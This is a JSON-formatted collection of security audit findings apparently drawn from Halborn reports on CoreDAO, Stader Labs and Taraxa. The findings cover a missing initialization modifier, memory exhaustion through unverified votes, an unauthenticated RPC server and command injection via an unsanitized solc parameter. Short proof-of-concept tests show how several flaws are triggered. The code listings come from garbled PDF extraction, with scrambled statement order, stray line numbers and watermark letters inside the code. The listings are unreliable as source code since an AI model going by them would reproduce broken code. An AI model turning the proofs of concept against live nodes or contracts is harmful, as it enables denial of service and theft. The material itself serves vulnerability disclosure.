        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CoreDAO_Genesis_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The onlyInit modifier throws an error If the source contract is not initialized. In the SystemReward contract, receiveRewards function is missing onlyInit modifier. If the function is called without initializa- tion, all address balance will be burned in the contract. Code Location: /contracts/SystemReward.sol#L40 Listing 11 function receiveRewards () external payable override { if ( msg . value > 0) { 1 2 3 4  incentiveBalanceCap }() ; 5 6 7 8 } } if ( address ( this ). balance > incentiveBalanceCap ) { IBurn ( BURN_ADDR ). burn { value : address ( this ). balance - } emit receiveDeposit ( msg . sender , msg . value ); /contracts/BtcLightClient.sol#L200 Listing 12 function claimRelayerReward ( address relayerAddr ) external { uint256 reward = relayerRewardVault [ relayerAddr ]; require ( reward != 0 , \" no relayer reward \" ); relayerRewardVault [ relayerAddr ] = 0; address payable recipient = payable ( relayerAddr ); ISystemReward ( SYSTEM_REWARD_ADDR ). claimRewards ( recipient , 1 2 3 4 5 6  reward ); } 7 42 Risk Level: Likelihood - 2 Impact - 4 Proof of Concept: Listing 13 1 2 3 4 5 6 7 8 function testReceiveRewardsMissingModifier () public { for ( uint i =0; i < addrSet . length ; i ++) { address newCandidate = addrSet [ i ]; vm . startPrank ( newCandidate , newCandidate ); systemReward . receiveRewards { value : 10000 ether }() ; vm . stopPrank () ; } } Recommendation: It is recommended to implement onlyInit modifier. Remediation Plan: SOLVED: The CoreDAO team solved the issue in the following commits b283001 and 9e290d8 by adding the onlyInit modifier. 43 ",
        "labels": [
            "Halborn",
            "CoreDAO_Genesis",
            "Severity: Medium"
        ]
    },
    {
        "title": "DUST IS ADDED INTO THE FIRST MINER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CoreDAO_Genesis_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "distributePowerReward function is used to distribute rewards for delegated hash power on the candidate validator. The method is designed to be called at the beginning of the turn round workflow. However, the remaining dust is always added to the first miner of the system. Code Location: /contracts/PledgeAgent.sol#L240 Listing 14 function distributePowerReward ( address candidate , address [] } // distribute rewards to every miner // note that the miners are represented in the form of reward // and they can be duplicated because everytime a miner return ; // if no hash power is delegated in the round , return RoundState storage rs = stateMap [ roundTag ]; if ( rs . power == 1) { 1  calldata miners ) external override onlyCandidate { 2 3 4 5 6 7 8  addresses 9  delegates a BTC block 10  BTCLightClient 11 12 13 14 15 16 17 18 19 Agent storage a = agentsMap [ candidate ]; uint256 l = a . rewardSet . length ; if ( l == 0) { } Reward storage r = a. rewardSet [l -1]; if ( r . totalReward == 0 || r . round != roundTag ) { return ; return ; } // to a validator on Core blockchain , a new record is added in 44 uint256 reward = rs . coin * POWER_BLOCK_FACTOR * rs . powerFactor uint256 totalReward = reward * minerSize ; uint256 remainReward = r . remainReward ; require ( remainReward >= totalReward , \" there is not enough for ( uint256 i = 0; i < minerSize ; i ++) { uint256 minerSize = miners . length ; rewardMap [ miners [ i ]] += reward ; } 20  / 10000 * r . totalReward / r . score ; 21 22 23 24 25  reward \"); 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 delete a . rewardSet [l -1]; if ( minerSize == 0) { } else if ( totalReward != 0) { if ( r . coin == 0) { } else { } } } } r. remainReward -= totalReward ; rewardMap [ miners [0]] += dust ; payable ( FOUNDATION_ADDR ). transfer ( remainReward ); uint256 dust = remainReward - totalReward ; if ( dust != 0) { Proof of Concept: Listing 15 def test_undelegate_with_reward ( self , pledge_agent ): operator = accounts [1] consensus = register_candidate ( operator = operator ) pledge_agent . delegateCoin ( operator , { \" value \": 1 2 3 4  MIN_INIT_DELEGATE_VALUE + 1 e19 }) 5 6 7 turn_round ([ consensus ]) pledge_agent . undelegateCoin ( operator ) 45 Risk Level: Likelihood - 3 Impact - 3 Recommendation: Consider changing workflow and distribute dust to the system contract. Remediation Plan: SOLVED: The CoreDAO team solved the issue in commit d2dfe1155f by sending dust to the system reward contract. 46 ",
        "labels": [
            "Halborn",
            "CoreDAO_Genesis",
            "Severity: Medium"
        ]
    },
    {
        "title": "EXPIRED PROPOSALS ARE NOT CHECKED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/CoreDAO_Genesis_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "GovHub is the governance contract for CoreDAO, a contract that allows any member to submit proposals with the initiator address stored in the proposer field. In the implementation, expired proposals are not check on the state function. Expired proposals still can be executed by the governance. Code Location: /contracts/GovHub.sol#L208 Listing 16 require ( proposalCount >= proposalId && proposalId > 0, \" state : function state ( uint256 proposalId ) public view returns ( } else if ( block . number <= proposal . startBlock ) { Proposal storage proposal = proposals [ proposalId ]; if ( proposal . canceled ) { } else if ( block . number <= proposal . endBlock ) { return ProposalState . Pending ; return ProposalState . Canceled ; 1  ProposalState ) { 2  invalid proposal id \"); 3 4 5 6 7 8 9 10  proposal . forVotes <= proposal . totalVotes / 2) { 11 12 13 14 15 16 17 } else if ( proposal . executed ) { return ProposalState . Succeeded ; return ProposalState . Executed ; return ProposalState . Defeated ; return ProposalState . Active ; } else { } } } else if ( proposal . forVotes <= proposal . againstVotes || 47 Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to check expired proposals on the state function. Remediation Plan: SOLVED: The CoreDAO team solved the issue in commit 82e9fad19c7 by adding the expired option in proposals. 48 3.10 (HAL-10) REQUIRE STATEMENTS ARE NOT COMPATIBLE WITH THE COMMENTS - LOW ",
        "labels": [
            "Halborn",
            "CoreDAO_Genesis",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF MANAGER TRANSFER FUNCTIONALITY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Stader_Labs_SD_Token_Staking_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The rewards-pool and lock contracts do not implement any functionality to change the manager address, which is set at contract instantiation. If the manager account keys are suspected to be compromised or if the development team needs to change the address for an operational reason, some functionality of the contract could be rendered unusable. It is worth mentioning that this issue has a very limited impact, as there is only one manager-only functionality that can be used once. Code Location: Listing 1: contracts/rewards-pool/src/contract.rs (Line 63) let mut config = CONFIG . load ( deps . storage ) ?; let sending_manager = info . sender . to_string () ; if sending_manager . ne (& config . manager ) { return Err ( ContractError :: Unauthorized {}) ; deps : DepsMut , info : MessageInfo , _env : Env , staking_contract : String , 54 pub fn update_configs ( 55 56 57 58 59 ) -> Result < Response , ContractError > { 60 61 62 63 64 65 66 67 68 69 70  () ) ?; } 71 72 73 config . staking_contract = deps } CONFIG . save ( deps . storage , & config ) ?; if config . staking_contract . eq (& Addr :: unchecked ( \"0 \" )) { . api . addr_validate ( staking_contract . to_lowercase () . as_str 13 74 75 76 77 78 } Ok ( Response :: new () . add_attribute ( \" method \" , \" update_configs \" ) . add_attribute ( \" staking_contract \" , staking_contract )) Listing 2: contracts/lock/src/contract.rs (Line 65) let mut config = CONFIG . load ( deps . storage ) ?; let sending_manager = info . sender ; if sending_manager . ne (& config . manager ) { return Err ( ContractError :: Unauthorized {}) ; } deps : DepsMut , info : MessageInfo , _env : Env , staking_contract : String , 57 pub fn update_configs ( 58 59 60 61 62 ) -> Result < Response , ContractError > { 63 64 65 66 67 68 69 70 71 72  () ) ?; 73 } 74 75 76 77 78 } config . staking_contract = deps CONFIG . save ( deps . storage , & config ) ?; if config . staking_contract . eq (& Addr :: unchecked ( \"0 \" )) { . api . addr_validate ( staking_contract . to_lowercase () . as_str Ok ( Response :: new () . add_attribute ( \" method \" , \" update_configs \" )) Risk Level: Likelihood - 3 Impact - 2 14 Recommendation: Manager transfer capabilities should be added to contracts as a two- step process split into a set_manager and a accept_manager functions. The latter requires the recipient to complete the transfer, effectively protecting the contract against potential typographical errors, compared to one-step manager transfer mechanisms. Remediation plan: RISK ACCEPTED: The risk for this issue was accepted by the Stader Labs team. They also mentioned that there is no use case for changing the manager in the future. 15 ",
        "labels": [
            "Halborn",
            "Stader_Labs_SD_Token_Staking_Contracts_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING BOUNDS ON",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Stader_Labs_SD_Token_Staking_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The staking contract has missing bounds on the emission_rate and unbonding_period variables. This can lead to unexpected contract behavior. The bounds of these parameters should be enforced to avoid potential errors in the current or future uses of these variables. Code Location: Listing 3: contracts/staking/src/contract.rs (Lines 44,48,64,66) set_contract_version ( deps . storage , CONTRACT_NAME , let state = State { deps : DepsMut , env : Env , _info : MessageInfo , msg : InstantiateMsg , 35 pub fn instantiate ( 36 37 38 39 40 ) -> Result < Response , ContractError > { 41  CONTRACT_VERSION ) ?; 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 }; STATE . save ( deps . storage , & state ) ?; let config = Config { manager : deps . api . addr_validate ( msg . manager . to_lowercase () . as_str () )?, xsd_cw20_contract : Addr :: unchecked ( \"0 \" ) , sd_cw20_contract : deps . api . addr_validate ( msg . sd_cw20_contract . to_lowercase () . emission_rate : msg . emission_rate , last_exchange_rate_updated_block : env . block . height , next_undelegate_id : 0, 16  as_str () )?, 58 59 60  () . as_str () )?, 61 62 63  () )?, 64 65 66 67 68 69 } rewards_pool_contract : deps . api . addr_validate ( msg . rewards_pool_contract . to_lowercase lock_contract : deps . api . addr_validate ( msg . lock_contract . to_lowercase () . as_str unbonding_period : msg . unbonding_period , }; CONFIG . save ( deps . storage , & config ) ?; Ok ( Response :: new () . add_attribute ( \" method \" , \" instantiate \" )) Listing 4: contracts/staking/src/contract.rs (Lines 369,370,373,374) deps : DepsMut , info : MessageInfo , _env : Env , update_config_request : UpdateConfigRequest , 337 pub fn update_config ( 338 339 340 341 342 ) -> Result < Response , ContractError > { 343 344 345 346 347 348 349 350 351 if sending_manager . ne (& config . manager ) { } return Err ( ContractError :: Unauthorized {}) ; let mut config = CONFIG . load ( deps . storage ) ?; let mut state = STATE . load ( deps . storage ) ?; let sending_manager = info . sender . to_string () . to_lowercase () ; if let Some ( sd_cw20 ) = update_config_request . sd_cw20_contract  { 352 config . sd_cw20_contract = deps . api . addr_validate ( sd_cw20 .  to_lowercase () . as_str () ) ?; 353 354 355 } if let Some ( xsd_cw20 ) = update_config_request .  xsd_cw20_contract { 356 357 if config . xsd_cw20_contract . eq (& Addr :: unchecked ( \" 0\" )) { config . xsd_cw20_contract = deps . api . addr_validate (  xsd_cw20 . to_lowercase () . as_str () ) ?; 358 } 17 359 360 361 362 } if let Some ( lock ) = update_config_request . lock_contract { config . lock_contract = deps . api . addr_validate ( lock .  to_lowercase () . as_str () ) ?; 363 364 365  { 366 } if let Some ( rpc ) = update_config_request . rewards_pool_contract config . rewards_pool_contract = deps . api . addr_validate ( rpc .  to_lowercase () . as_str () ) ?; 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 } } if let Some ( er ) = update_config_request . emission_rate { state . emission_rate = er ; } if let Some ( up ) = update_config_request . unbonding_period { config . unbonding_period = up ; } CONFIG . save ( deps . storage , & config ) ?; STATE . save ( deps . storage , & state ) ?; Ok ( Response :: new () . add_attribute ( \" method \" , \" update_config \" )) Risk Level: Likelihood - 4 Impact - 1 Recommendation: Upper and lower bounds for the emission_rate and unbonding_period vari- ables should be applied when they are updated during the execution of the update_config function and at instantiation. 18 Remediation plan: SOLVED: The issue was fixed with the above recommendation in commits:  2f1aa9ae1db519d452fa3456fa912a562041b666  ea46b4313fc5ce14d9b8adedb290a1a4b4b28829 19 ",
        "labels": [
            "Halborn",
            "Stader_Labs_SD_Token_Staking_Contracts_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF ADDRESS NORMALIZATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Stader_Labs_SD_Token_Staking_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The set_manager function of the staking contract takes user input directly as an address without performing any validation. This could lead to failed messages or the storage of incorrect information. However, the impact in this particular case is very limited since the address submitted in the set_manager function must execute the accept_manager function to finish the process, protecting against po- tential mistakes such as those mentioned. Code Location: Listing 5: contracts/staking/src/contract.rs (Lines 93,103) let config = CONFIG . load ( deps . storage ) ?; if info . sender . ne (& config . manager ) { return Err ( ContractError :: Unauthorized {}) ; } deps : DepsMut , info : MessageInfo , _env : Env , manager : String , 89 pub fn set_manager ( 90 91 92 93 94 ) -> Result < Response , ContractError > { 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 deps . storage , & TmpManagerStore { manager : manager . clone () , TMP_MANAGER_STORE . save ( Ok ( Response :: new () ) ?; }, . add_attribute ( \" method \" , \" set_manager \" ) . add_attribute ( \" new_manager \" , manager )) 20 Risk Level: Likelihood - 1 Impact - 1 Recommendation: One of the two approaches detailed below should be used:  In addition to validation, addresses should be normalized to lower- case before being stored for future use.  Instead of just validation, addresses should be stored in canon- ical format using the cosmwasm_std::Api::addr_canonicalize utility function. The following considerations should be considered when implementing the second option:  To successfully compare a canonical address, both ends should be in canonical format. For example, when performing access controls, the sender (e.g.: info.sender or env.message.sender) should also be canonicalized beforehand.  To send funds to a canonicalized address or include it in a message to a different contract, it should be first turn into its human-readable format via the cosmwasm_std::Api::addr_humanize utility function Remediation plan: SOLVED: The issue was fixed with the above recommendation in commit 0f3fbb9237c43f381987e113fa418d4cd1afbb57. 21 ",
        "labels": [
            "Halborn",
            "Stader_Labs_SD_Token_Staking_Contracts_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "CONFIGURATION PARAMETER NOT SET UPON INSTANTIATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Stader_Labs_SD_Token_Staking_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The instantiate function did not set the staking_contract address, as it did for other required contract addresses in the configuration. Instead, it relied on update_config being called post initialization. If the stacking address is not set by calling update_config before executing transfer_rewards, an attempt to transfer to address 0 will end the panic! macro and unnecessary consumption of gas fee per transaction. It is worth noting that the update_config function only allowed setting the staking address if it contained the initial value Addr::unchecked(\"0\"). This effectively forbids any future change after the first update. Code Location: Listing 6: contracts/rewards-pool/src/contract.rs (Line 25) let config = Config { deps : DepsMut , _env : Env , _info : MessageInfo , msg : InstantiateMsg , 18 pub fn instantiate ( 19 20 21 22 23 ) -> Result < Response , ContractError > { 24 25 26 27 28  as_str () )?, 29 30 31 32 }; staking_contract : Addr :: unchecked ( \" 0\" ) , sd_cw20_contract : deps . api . addr_validate ( msg . sd_cw20_contract . to_lowercase () . manager : deps . api . addr_validate ( msg . manager . to_lowercase () . as_str () )?, 22 Listing 7: contracts/lock/src/contract.rs (Line 31) deps : DepsMut , _env : Env , _info : MessageInfo , msg : InstantiateMsg , 18 pub fn instantiate ( 19 20 21 22 23 ) -> Result < Response , ContractError > { 24 25 26 27 28 29 30  as_str () )?, 31 32 33  CONTRACT_VERSION ) ?; 34 sd_cw20_contract : deps CONFIG . save ( deps . storage , & config ) ?; let config = Config { manager : deps . api . addr_validate ( msg . manager . to_lowercase () . as_str () )?, . api . addr_validate ( msg . sd_cw20_contract . to_lowercase () . staking_contract : Addr :: unchecked ( \" 0\" ) , }; set_contract_version ( deps . storage , CONTRACT_NAME , Risk Level: Likelihood - 1 Impact - 1 Recommendation: The staking_contract variable should be set on instantiate, as with the other contract addresses. Remediation plan: ACKNOWLEDGED: The Stader Labs team acknowledged this finding. 23 ",
        "labels": [
            "Halborn",
            "Stader_Labs_SD_Token_Staking_Contracts_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "VOTES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Uncontrolled resource consumption and out-of-memory (OOM) vulnerability was observed within taraxa-node code. This could be exploited in a Denial of Service/Distributed Denial of Service (DoS/DDoS) attack against the taraxa node via p2p messaging. The attack could be performed by a peer rapidly sending multiple un- verifiable votes, which would be handled later on via VotePacketHandler . Calling the addUnverifiedVote function would append the votes to an unverified_votes_ memory map that it would continue to grow without limit, causing the node to crash. Code Location: The main cause of the problem was within the VotePacketHandler packet, and unverified votes were stored in the classic memory map. The attacker could send a vote packet containing 1000 votes. Listing 1: s/vote_packet_handler.cpp (Line 57) /libraries/core_libs/network/src/tarcap/packets_handler- auto vote = std :: make_shared < Vote >( packet_data . rlp_ [ i ]. data () . std :: vector < std :: shared_ptr < Vote >> votes ; const auto count = packet_data . rlp_ . itemCount () ; for ( size_t i = 0; i < count ; i ++) { 23 24 void VotePacketHandler :: process ( const PacketData & packet_data ,  const std :: shared_ptr < TaraxaPeer > & peer ) { 25 26 27 28  toBytes () ); 29 30 31 32 33 34 const auto vote_round = vote -> getRound () ; const auto current_pbft_round = pbft_mgr_ -> getPbftRound () ; const auto vote_hash = vote -> getHash () ; LOG ( log_dg_ ) << \" Received PBFT vote \" << vote_hash ; 16 E D O N A X A R A T // Votes vote_round >= current_pbft_round // Synchronization point in case multiple threads are LOG ( log_dg_ ) << \" Received PBFT vote \" << vote_hash << \" ( // Synchronization point in case multiple threads are LOG ( log_dg_ ) << \" Received vote \" << vote_hash << \" ( from \" } else if ( vote_mgr_ -> addRewardVote ( vote )) { // As peers have small caches of known votes . Only mark } << \" ) already seen . \"; } continue ; if (! seen_votes_ . insert ( vote_hash )) { peer -> markVoteAsKnown ( vote_hash ); votes . push_back ( std :: move ( vote )) ; // Check reward vote if ( vote_round < current_pbft_round ) { 35 36 37  processing the same vote at the same time 38 39  << packet_data . from_node_id_ . abridged () 40 41 42  gossiping votes 43 44 45 46 47 48 49 50  processing the same vote at the same time 51 if (! seen_votes_ . insert ( vote_hash )) { 52  from \" << packet_data . from_node_id_ . abridged () 53 54 55 56 57 58  addUnverifiedVote ( vote )) { 59  from \" << packet_data . from_node_id_ . abridged () 60 61 62 63  votes . Only mark gossiping votes 64 65 66 67 68 69 } peer -> markVoteAsKnown ( vote_hash ); votes . push_back ( std :: move ( vote )) ; onNewPbftVotes ( std :: move ( votes )); << \" ) already seen .\" ; continue ; continue ; } } // Adds unverified vote into queue if ( vote_mgr_ -> voteInVerifiedMap ( vote ) || ! vote_mgr_ -> LOG ( log_dg_ ) << \" Received PBFT vote \" << vote_hash << \" ( << \" ) already saved in ( un ) verified queues . \" ; } // Do not mark it before , as peers have small caches of known 17 E D O N A X A R A T Listing 2: s/vote_packet_handler.cpp (Lines 72,66) /libraries/core_libs/network/src/tarcap/packets_handler- { LOG ( log_dg_ ) << \" Vote \" << hash << \" is in unverified map // this will cache object variables - if (! found_round -> second . insert ({ hash , vote }) . second ) { UniqueLock lock ( unverified_votes_access_ ); if ( auto found_round = unverified_votes_ . find ( pbft_round ); uint64_t pbft_round = vote -> getRound () ; const auto & hash = vote -> getHash () ; vote -> getVoterAddr () ; 58 59 bool VoteManager :: addUnverifiedVote ( std :: shared_ptr < Vote > const &  vote ) { 60 61 62  speed up 63 64 65 66  found_round != unverified_votes_ . end () ) { 67 68  already \" ; 69 70 71 72  { std :: make_pair ( hash , vote ) }; 73 74 75 76  abridged () ; 77 78 79 } 80 } LOG ( log_nf_ ) << \" Add unverified vote \" << vote -> getHash () . unverified_votes_ [ pbft_round ] = std :: move ( votes ); std :: unordered_map < vote_hash_t , std :: shared_ptr < Vote >> votes return false ; return true ; } else { } } Listing 3: /libraries/core_libs/consensus/include/vote_manager/vote_- manager.hpp (Line 336) 334 335 336 // < pbft round , < vote hash , vote >> std :: map < uint64_t , std :: unordered_map < vote_hash_t , std ::  shared_ptr < Vote >>> unverified_votes_ ; E D O N A X A R A T 18 Risk Level: Likelihood - 5 Impact - 5 Recommendation: Use ExpirationCache to store unverified votes instead of the classic C++ map. Remediation Plan: SOLVED: The Taraxa team solved the issue by removing unverified_votes_ and refactoring the vote_manager class. ece157723262507f0209942fc573b80f5e436eb6 E D O N A X A R A T 19 ",
        "labels": [
            "Halborn",
            "Taraxa_Node_EVM_L1",
            "Severity: Critical"
        ]
    },
    {
        "title": "RPC",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The RPC Server did not implement authentication or level-based access control, which allowed anyone with network level access to create raw transactions using the send_coin_transaction call. Risk Level: Likelihood - 5 Impact - 5 Recommendation: Implement RPC Authentication and whitelisting for users, where users must have privileges to call specifics group of RPC calls. Remediation Plan: The Taraxa team SOLVED: eth_sendTransaction call and disabling the RPC by default. 1914 solved issue the by removing the 20 E D O N A X A R A T ",
        "labels": [
            "Halborn",
            "Taraxa_Node_EVM_L1",
            "Severity: Critical"
        ]
    },
    {
        "title": "BLOCK QUEUE WARNING WILL BLOCK INSTEAD OF WARNING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf",
        "body": "There was a typo in the name within the configuration file. The user could supply the max_block_queue_warn number, expecting to generate warning logs. Instead, it would block the addition of new blocks to the queue. Listing 4: libraries/core_libs/node/src/node.cpp (Line 109) dag_mgr_ = std :: make_shared < DagManager >( dag_genesis_block_hash , std :: make_shared < DagBlockManager >( node_addr , conf_ . chain . pbft_chain_ , conf_ . 17 dag_blk_mgr_ = 18  sortition , conf_ . chain . dag , db_ , trx_mgr_ , final_chain_ , 19  max_block_queue_warn , conf_ . max_levels_per_period ); 20  node_addr , trx_mgr_ , pbft_chain_ , dag_blk_mgr_ , db_ , 21  conf_ . light_node_history , conf_ . max_levels_per_period , 22 23  final_chain_ , next_votes_mgr_ ); `` ` 24 vote_mgr_ = std :: make_shared < VoteManager >( node_addr , db_ , conf_ . is_light_node , conf_ . dag_expiry_limit ); Listing 5: libraries/core_libs/consensus/src/dag/dag_block_manager.cpp (Lines 113,114) 99 DagBlockManager :: InsertAndVerifyBlockReturnType DagBlockManager ::  insertAndVerifyBlock ( DagBlock && blk ) { 100 101 if ( isDagBlockKnown ( blk . getHash () )) { LOG ( log_dg_ ) << \" Trying to push new unverified block \" << blk .  getHash () . abridged () 102 103 104 105 106 << \" that is already known , skip it \" ; return InsertAndVerifyBlockReturnType :: AlreadyKnown ; } // Mark block as seen - synchronization point in case multiple  threads are processing the same block at the same time E D O N A X A R A T 21 107 108 if (! markDagBlockAsSeen ( blk )) { LOG ( log_dg_ ) << \" Trying to push new unverified block \" << blk .  getHash () . abridged () 109 110 111 112 113 114 << \" that is already marked as known , skip it \" ; return InsertAndVerifyBlockReturnType :: AlreadyKnown ; } if ( queue_limit_ > 0) { if ( const auto queue_size = getDagBlockQueueSize () ;  queue_limit_ < queue_size ) { 115 LOG ( log_er_ ) << \" Block queue large . Verified queue : \" <<  queue_size << \" ; Limit : \" << queue_limit_ ; 116 117 118 119 120 } return InsertAndVerifyBlockReturnType :: BlockQueueOverflow ; } const auto verified = verifyBlock ( blk ); if ( verified == InsertAndVerifyBlockReturnType ::  InsertedAndVerified ) { Risk Level: Likelihood - 1 Impact - 1 Recommendation: Rename max_block_queue_warn to max_block_queue. Remediation Plan: SOLVED: The Taraxa team solved the issue within the new dag block refac- toring pull request. 1884 22 E D O N A X A R A T TARAXA EVM 23 ",
        "labels": [
            "Halborn",
            "Taraxa_Node_EVM_L1",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNFILTERED PARAMETER ALLOWED TO EXECUTE COMMANDS ON THE HOST",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The SolidityVersion function located in common/compiler/solidity.go was detected to be vulnerable to uncontrolled command execution. The input parameter used by the function was not correctly sanitized, allowing an attacker to abuse the functionality and execute commands in the underlying Operating System. Code Location:  Taraxa-evm/common/compiler/solidity.go Listing 6: Taraxa-evm/common/compiler/solidity.go (Lines 89-92,94,96) solc = \" solc \" if solc == \"\" { 88 // SolidityVersion runs solc and parses its version output . 89 func SolidityVersion ( solc string ) (* Solidity , error ) { 90 91 92 93 94 95 96 97 98 99 100 101 102 } var out bytes . Buffer cmd := exec . Command ( solc , \" -- version \") cmd . Stdout = & out err := cmd . Run () if err != nil { } matches := versionRegexp . FindStringSubmatch ( out . String () ) if len ( matches ) != 4 { return nil , err return nil , fmt . Errorf ( \" can 't parse solc version %q \" , out .  String () ) 103 104 } s := & Solidity { Path : cmd . Path , FullVersion : out . String () ,  Version : matches [0]} 105 106 if s . Major , err = strconv . Atoi ( matches [1]) ; err != nil { return nil , err 24 M V E A X A R A T 107 108 109 110 111 112 113 114 115 } } if s . Minor , err = strconv . Atoi ( matches [2]) ; err != nil { return nil , err } if s . Patch , err = strconv . Atoi ( matches [3]) ; err != nil { return nil , err } return s , nil Proof of Concept: Listing 7: PoC.go (Line 11) 1 2 package main 3 4 import ( 5 6 7 ) 8 9 func main () { 10 11 12 } \" os \" \" github . com / Taraxa - project / taraxa - evm / common / compiler \" // Call to the SolidityVersion function compiler . SolidityVersion ( os . Args [1]) M V E A X A R A T 25 Figure 1: Command execution invoking curl command as an example. Risk Level: Likelihood - 3 Impact - 3 Recommendation: Avoid using the os/exec library whenever possible. This would allow an attacker to interact and execute commands on the underlying Operating However, filtering the input System when it is not used correctly. parameters would make the implementation of the function more secure. Remediation Plan: SOLVED: The Taraxa team solved the issue by removing the solidity.go file. 5abe0c4dbcc94d5ee1b991fa9efcf15af16502a1 26 M V E A X A R A T ",
        "labels": [
            "Halborn",
            "Taraxa_Node_EVM_L1",
            "Severity: Medium"
        ]
    },
    {
        "title": "LACK OF RETURN ERROR",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf",
        "body": "No return statements were found in the function that would return an error, due to the lack of a default statement in the Switch clause. In case another method makes use of this function, the error would never be caught, triggering undefined behavior in the EVM and consequently in the Node. Code Location:  Taraxa-evm/accounts/abi/abi.go Listing 8: Taraxa-evm/accounts/abi/abi.go (Lines 110,93,132) } var fields [] struct { [] Argument [] Argument string Type string Name Constant bool Anonymous bool Inputs Outputs 92 // UnmarshalJSON implements json . Unmarshaler interface 93 func ( abi * ABI ) UnmarshalJSON ( data [] byte ) error { 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 abi . Methods = make ( map [ string ] Method ) abi . Events = make ( map [ string ] Event ) for _ , field := range fields { abi . Constructor = Method { Inputs : field . Inputs , switch field . Type { case \" constructor \" : return err } } if err := json . Unmarshal ( data , & fields ); err != nil { 27 M V E A X A R A T 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 // empty defaults to function according to the abi spec case \" function \" , \" \": abi . Methods [ field . Name ] = Method { Name : Const : Inputs : Outputs : field . Outputs , field . Name , field . Constant , field . Inputs , } case \" event \" : abi . Events [ field . Name ] = Event { field . Name , Name : Anonymous : field . Anonymous , Inputs : field . Inputs , } } } return nil Risk Level: Likelihood - 3 Impact - 3 Recommendation: Include a Default statement that could be triggered on error, and update the return value accordingly. Remediation Plan: The Taraxa team default SOLVED: clause with an error message, which would be triggered in case the switch statement could not satisfy any of the offered options. 95f111ec8f9812f2174db0abd97af98c95e5ea77 solved adding issue the by a 28 M V E A X A R A T ",
        "labels": [
            "Halborn",
            "Taraxa_Node_EVM_L1",
            "Severity: Medium"
        ]
    },
    {
        "title": "LACK OF SIZE CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The affected functions did not check the size of the array before performing the access. The function could trigger an Out-of-Bounds state and consequent Panic when trying to access a non-existent position. Code Location:  Taraxa-evm/taraxa/util/bin/index.go:ENC_b_endian_compact_64  Taraxa-evm/taraxa/util/bin/index.go:DEC_b_endian_compact_64  Taraxa-evm/taraxa/util/bin/index.go:ENC_b_endian_64  Taraxa-evm/taraxa/util/bin/index.go:DEC_b_endian_64 Listing 9: Taraxa-evm/taraxa/util/bin/index.go (Lines 65-66) return uint64 ( b [0]) < <56 | uint64 ( b [1]) < <48 | uint64 ( b [2]) < <40 uint64 ( b [4]) < <24 | uint64 ( b [5]) < <16 | uint64 ( b [6]) < <8 | 64 func DEC_b_endian_64 (b [] byte ) uint64 { 65  | uint64 ( b [3]) < <32 | 66  uint64 (b [7]) 67 } M V E A X A R A T 29 Proof of Concept: Figure 2: Out-of-Bound error triggered by go-fuzz fuzzer. Risk Level: Likelihood - 3 Impact - 3 Recommendation: As Check the size of the array before performing bitwise operations. a general rule, the size of the array should be checked before any operation, so as not to trigger unhandled exceptions. Remediation Plan: The Taraxa team default SOLVED: clause with an error message, which would be triggered in case the switch statement could not satisfy any of the offered options. 85b89e5aed7f31f64cabe6e0dbd1bc8f1a1fc904 solved adding issue the by a M V E A X A R A T 30 ",
        "labels": [
            "Halborn",
            "Taraxa_Node_EVM_L1",
            "Severity: Medium"
        ]
    },
    {
        "title": "INCORRECT NIL VALUE RETURNED ON AN ERROR",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/L1 Audits/Taraxa_Node_EVM_L1_Security_Audit_Report_Halborn_Final.pdf",
